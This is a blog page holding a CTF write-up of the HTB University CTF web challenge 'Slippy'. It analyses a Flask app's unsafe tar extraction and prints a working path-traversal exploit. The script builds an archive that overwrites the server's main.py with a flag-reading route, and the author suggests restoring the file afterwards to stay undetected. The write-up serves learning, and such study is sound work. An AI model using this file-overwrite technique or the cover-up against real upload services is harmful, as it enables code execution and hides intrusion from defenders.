<!DOCTYPE html>
<html lang="en">
  <head>
    
      <title>
        HTB UNI CTF : Web Slippy ::
        Yojan&#39;s Blog
      </title>
    
    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<meta
  name="description"
  content="Analyze For this challenge we were given the source file of the site, looking at the website we can see that it wants a tar.gz file as the input.
The directory tree of the source code as follow.
./challenge ├── application │ ├── blueprints │ │ └── routes.py │ ├── config.py │ ├── main.py │ ├── static │ │ ├── archives │ │ ├── css │ │ │ ├── bootstrap.min.css │ │ │ └── main."
/>
<meta
  name="keywords"
  content="Writeups Programming CTF Linux Hacking Computer"
/>
<meta name="robots" content="noodp" />
<link rel="canonical" href="/post/writeups/htb-uni-ctf/web-slippy/" />





<link rel="stylesheet" href="/assets/style.css" />

<link rel="stylesheet" href="/style.css" />


<link
  rel="apple-touch-icon-precomposed"
  sizes="144x144"
  href="/img/apple-touch-icon-144-precomposed.png"
/>
<link rel="shortcut icon" href="/img/favicon.png" />


<link href="/assets/fonts/Inter-Italic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
<link href="/assets/fonts/Inter-Regular.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
<link href="/assets/fonts/Inter-Medium.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
<link href="/assets/fonts/Inter-MediumItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
<link href="/assets/fonts/Inter-Bold.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
<link href="/assets/fonts/Inter-BoldItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">


<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="HTB UNI CTF : Web Slippy"/>
<meta name="twitter:description" content="Analyze For this challenge we were given the source file of the site, looking at the website we can see that it wants a tar.gz file as the input.
The directory tree of the source code as follow.
./challenge ├── application │ ├── blueprints │ │ └── routes.py │ ├── config.py │ ├── main.py │ ├── static │ │ ├── archives │ │ ├── css │ │ │ ├── bootstrap.min.css │ │ │ └── main."/>



<meta property="og:title" content="HTB UNI CTF : Web Slippy" />
<meta property="og:description" content="Analyze For this challenge we were given the source file of the site, looking at the website we can see that it wants a tar.gz file as the input.
The directory tree of the source code as follow.
./challenge ├── application │ ├── blueprints │ │ └── routes.py │ ├── config.py │ ├── main.py │ ├── static │ │ ├── archives │ │ ├── css │ │ │ ├── bootstrap.min.css │ │ │ └── main." />
<meta property="og:type" content="article" />
<meta property="og:url" content="/post/writeups/htb-uni-ctf/web-slippy/" /><meta property="article:section" content="post" />
<meta property="article:published_time" content="2021-11-22T15:16:32-05:00" />
<meta property="article:modified_time" content="2021-11-22T15:16:32-05:00" /><meta property="og:site_name" content="Yojan&#39;s Blog" />







  </head>
  <body class="dark-theme">
    <div class="container">
      <header class="header">
  <span class="header__inner">
    <a
  href="/"
  class="logo"
  style="text-decoration: none;"
>
  
    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
  <path fill="none" d="M15 8l14.729 14.382L15 35.367" />
</svg>
</span>
    <span class="logo__text"
      >Yojan&#39;s Blog</span
    >
    <span class="logo__cursor"></span>
  
</a>

    <span class="header__right">
      
      <span class="theme-toggle">
        <svg
  class="theme-toggler"
  width="24"
  height="24"
  viewBox="0 0 48 48"
  fill="none"
  xmlns="http://www.w3.org/2000/svg"
>
  <path
    d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"
  />
</svg>

      </span>
    </span>
  </span>
</header>


      <div class="content">
        
  
  

  <div class="post">
    <h1 class="post-title">HTB UNI CTF : Web Slippy</h1>
    <div class="post-meta">
      
        <span class="post-date">
          2021-11-22
        </span>

        
          
        
      

      


      
        <span class="post-read-time"
          >— 3 min read</span
        >
      
    </div>

    

    

    <div class="post-content">
      
      <p><img src="/web_slippy/ChallengeDescription.png" alt=""></p>
<h2 id="analyze">Analyze</h2>
<p>For this challenge we were given the source file of the site, looking at the website we can see that it wants a tar.gz file as the input.</p>
<p><img src="/web_slippy/Website.png" alt=""></p>
<p>The directory tree of the source code as follow.</p>
<pre tabindex="0"><code>./challenge
├── application
│   ├── blueprints
│   │   └── routes.py
│   ├── config.py
│   ├── main.py
│   ├── static
│   │   ├── archives
│   │   ├── css
│   │   │   ├── bootstrap.min.css
│   │   │   └── main.css
│   │   ├── images
│   │   │   ├── card-body2.png
│   │   │   ├── card-btm2.png
│   │   │   ├── card-top2.png
│   │   │   └── upload-doc.png
│   │   └── js
│   │       ├── bootstrap.min.js
│   │       ├── jquery-3.6.0.min.js
│   │       ├── main.js
│   │       └── TweenMax.min.js
│   ├── templates
│   │   └── index.html
│   └── util.py
├── flag
└── run.py
</code></pre><p>We can see that the flag file is in the same directory as the run.py</p>
<p>So I am assuming that we have to figure out a way to read the flag file.</p>
<p><em><strong>Util.py</strong></em></p>
<pre tabindex="0"><code>import functools, tarfile, tempfile, os
from application import main

generate = lambda x: os.urandom(x).hex()

def extract_from_archive(file):
    tmp  = tempfile.gettempdir()
    path = os.path.join(tmp, file.filename)
    file.save(path)

    if tarfile.is_tarfile(path):
        tar = tarfile.open(path, 'r:gz')
        tar.extractall(tmp)

        extractdir = f'{main.app.config[&quot;UPLOAD_FOLDER&quot;]}/{generate(15)}'
        os.makedirs(extractdir, exist_ok=True)

        extracted_filenames = []

        for tarinfo in tar:
            name = tarinfo.name
            if tarinfo.isreg():
                filename = f'{extractdir}/{name}'
                os.rename(os.path.join(tmp, name), filename)
                extracted_filenames.append(filename)
                continue

            os.makedirs(f'{extractdir}/{name}', exist_ok=True)

        tar.close()
        return extracted_filenames

    return False
</code></pre><p>This is the code that is used to extract the given tar file.</p>
<p>Let&rsquo;s examine this code a bit further.</p>
<pre tabindex="0"><code>generate = lambda x: os.urandom(x).hex()
</code></pre><p>It is used to generate a random number of the length x. Another way of writing this would be.</p>
<pre tabindex="0"><code>def generate(x):
	return os.urandom(x).hex()

</code></pre><pre tabindex="0"><code>		extractdir = f'{main.app.config[&quot;UPLOAD_FOLDER&quot;]}/{generate(15)}'
        os.makedirs(extractdir, exist_ok=True)
</code></pre><p>So here they use the generate to create a new folder to avoid files to collide when they have same name.</p>
<pre tabindex="0"><code>➜  application git:(main) ✗ cat config.py

from application.util import generate
from os.path import abspath

class Config(object):
    SECRET_KEY = generate(50)
    UPLOAD_FOLDER = '/app/application/static/archives'

class ProductionConfig(Config):
    pass

class DevelopmentConfig(Config):
    DEBUG = True

class TestingConfig(Config):
    TESTING = True

</code></pre><p>We can see that the tar file gets extracted at path <code>/app/application/static/archives/{somerandom}/</code></p>
<p>We also know that the flag is at <code>/app/</code></p>
<h2 id="recon">Recon</h2>
<p><a href="https://bugzilla.redhat.com/show_bug.cgi?id=263261">https://bugzilla.redhat.com/show_bug.cgi?id=263261</a></p>
<p>By searching up on the internet, I found this cool bug in the tar file library in python.</p>
<p>After reading this for the first time, I thought I could use the <code>../../../flag</code> as my file name and the download the flag. Seems pretty simple right?</p>
<p>Well Not really.</p>
<p>The <code>os.rename()</code> overrides the existing file in the directory.</p>
<h2 id="exploit">Exploit</h2>
<p>For the exploit, I thought of overriding the <code>main.py</code> file and adding a API endpoint that opens the flag and returns it.</p>
<pre tabindex="0"><code>rom flask import Flask, jsonify
from application.blueprints.routes import web, api

app = Flask(__name__)
app.config.from_object('application.config.Config')

app.register_blueprint(web, url_prefix='/')
app.register_blueprint(api, url_prefix='/api')

@app.errorhandler(404)
def not_found(error):
    return jsonify({'error': 'Not Found'}), 404

@app.errorhandler(403)
def forbidden(error):
    return jsonify({'error': 'Not Allowed'}), 403

@app.errorhandler(400)
def bad_request(error):
    return jsonify({'error': 'Bad Request'}), 400

@app.route('/flag')
def flag():
    file = open('/app/flag', 'r')
    return f.read()
</code></pre><p>This is what the new main file will look like.</p>
<p>If we wanted to be undetected, we can upload the actual main.py file after we get the flag, so that they won&rsquo;t figure out where we got the flag from.</p>
<pre tabindex="0"><code>import tarfile, requests

zpath = &quot;../../../main.py&quot;


tf = tarfile.open(&quot;payload.tar.gz&quot;, &quot;w:gz&quot;)
tf.add('main.py', zpath)
tf.close()



url = &quot;http://64.227.36.32:32187/api/unslippy&quot;

files = {&quot;file&quot;: open('payload.tar.gz', 'rb')}

r = requests.post(url, files=files)

flag = requests.get(&quot;http://64.227.36.32:32187/flag&quot;)

print(flag.text)
</code></pre><p>I wrote a simple script that will take the main.py file and add directory trasverasl stuffs infront of the file, and creates a tar.gz file.</p>
<p>Then it will upload the file to the server, later it will use the /flag endpoint to extract the flag.</p>
<pre tabindex="0"><code>HTB{i_slipped_my_way_to_rce}
</code></pre>
    </div>
    
      
        <div class="pagination">
          <div class="pagination__title">
            <span class="pagination__title-h"
              >Read other posts</span
            >
            <hr />
          </div>
          <div class="pagination__buttons">
            
              <span class="button previous">
                <a href="/post/writeups/metactf/web-inspection/">
                  <span class="button__icon">←</span>
                  <span class="button__text">Hacking Electron App - Web Inspection - MetaCTF</span>
                </a>
              </span>
            
            
              <span class="button next">
                <a href="/post/writeups/htb-uni-ctf/lighttheway/">
                  <span class="button__text">HTB UNI CTF : Light The Way</span>
                  <span class="button__icon">→</span>
                </a>
              </span>
            
          </div>
        </div>
      
    

    
      
        

      
    
  </div>

      </div>

      
        <footer class="footer">
  <div class="footer__inner">
    
      <a
  href="/"
  class="logo"
  style="text-decoration: none;"
>
  
    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
  <path fill="none" d="M15 8l14.729 14.382L15 35.367" />
</svg>
</span>
    <span class="logo__text"
      >Yojan&#39;s Blog</span
    >
    <span class="logo__cursor"></span>
  
</a>

      <div class="copyright">
        <span
          >© 2021 Powered by
          <a href="https://gohugo.io" target="_blank" rel="noopener">Hugo</a></span
        >
        <span
          >Theme created by
          <a href="https://twitter.com/panr" target="_blank" rel="noopener">panr</a></span
        >
      </div>
    
  </div>
</footer>

<script src="/assets/main.js"></script>
<script src="/assets/prism.js"></script>

<script src="https://cdnjs.cloudflare.com/ajax/libs/medium-zoom/1.0.6/medium-zoom.min.js" integrity="sha512-N9IJRoc3LaP3NDoiGkcPa4gG94kapGpaA5Zq9/Dr04uf5TbLFU5q0o8AbRhLKUUlp8QFS2u7S+Yti0U7QtuZvQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>


<script>
const images = Array.from(document.querySelectorAll(".post-content img"));
images.forEach(img => {
  mediumZoom(img, {
    margin: 0,  
    scrollOffset: 40,  
    container: null,  
    template: null  
  });
});
</script>


      
    </div>

    
  </body>
</html>
